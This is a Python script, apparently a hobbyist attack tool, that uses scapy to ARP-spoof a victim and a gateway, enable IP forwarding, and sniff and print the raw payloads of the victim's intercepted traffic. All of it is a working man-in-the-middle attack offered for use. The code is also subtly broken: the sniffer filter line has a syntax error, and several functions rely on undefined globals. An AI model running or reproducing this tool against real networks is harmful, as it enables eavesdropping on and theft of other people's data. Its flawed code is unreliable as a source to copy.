from scapy.all import *
import os
import sys
import time

def mac(IP):
    ans, unans = arping(IP, verbose=0)
    for s, r in ans:
        return r[Ether].src

def spoof(victimMac, gatewayMac):
    arppkt1 = ARP(op=2, psrc=gateway, pdst=victimIP, hwdst=victimMac)
    arppkt2 = ARP(op=2, psrc=victimIP, pdst=gateway, hwdst=gatewayMac)
    send(arppkt1, verbose=0)
    send(arppkt2, verbose=0)

def portforward():
    print('\033[31m')
    print("{+} Enabling IP Forwarding")
    print('\033[0m')
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def restore(victimMac, gatewayMac):
    svictim = ARP(op=2, pdst=gateway, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMac)
    sgateway = ARP(op=2, pdst=victimIP, psrc=gateway, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gatewayMac)
    print('\033[93m')
    print("{+} Restoring targets")
    print('\033[0m')
    send(svictim, count=5, verbose=0)
    send(sgateway, count=5, verbose=0)
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print('\033[91m')
    print("{*} Exiting...")
    print('\033[0m')
    sys.exit(1)

def sniffer():
     sniff(filter="host " + str(victimIP) " or " + str(gateway),  prn=lambda x:x.sprintf(" Source: %Ether.src%, \n %Raw.load% "), count=1)

def attack(tgtIP, gateIP):
    portforward()
    victimMac = mac(tgtIP)
    print('\033[36m')
    print("Victim MAC: {}".format(victimMac))
    print('\033[0m')
    if victimMac == None:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print('\033[36m')
        print("{-} Couldn't get Victim's MAC address\nExiting...")
        print('\033[0m')
        sys.exit(1)
    else:
        pass
    gatewayMac = mac(gateIP)
    print('\033[36m')
    print("Gateway MAC: {}".format(gatewayMac))
    print('\033[0m')
    if gatewayMac == None:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print('\033[36m')
        print("{-} Couldn't get Gateways MAC address\nExiting...")
        print('\033[0m')
        sys.exit(1)
    else:
        pass

    print('\033[32m')
    print("{+} Spoofing targets")
    print('\033[0m')
    while 1:
        try:
            spoof(victimMac, gatewayMac)
            time.sleep(1)
            sniffer()
        except KeyboardInterrupt:
            restore(victimMac, gatewayMac)

